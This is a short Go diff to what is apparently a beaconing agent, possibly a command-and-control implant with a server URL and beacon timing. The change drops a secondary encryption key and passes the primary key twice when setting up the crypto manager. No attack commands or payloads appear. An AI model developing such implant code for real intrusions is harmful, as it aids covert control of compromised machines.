@@ -21,8 +21,7 @@ import (
 // AgentConfig holds all agent configuration baked in at build time
 type AgentConfig struct {
 	ServerURL    string
-	PrimaryKey   string
-	SecondaryKey string
+	PrimaryKey string
 
 	// Beacon timing
 	Interval      int     // seconds
@@ -92,7 +91,7 @@ type Agent struct {
 
 // NewAgent constructs and optionally validates the environment
 func NewAgent(cfg *AgentConfig) (*Agent, error) {
-	cryptoMgr, err := crypto.NewManager(cfg.PrimaryKey, cfg.SecondaryKey)
+	cryptoMgr, err := crypto.NewManager(cfg.PrimaryKey, cfg.PrimaryKey)
 	if err != nil {
 		dbgf("[!] Crypto init failed: %v\n", err)
 		cryptoMgr = nil
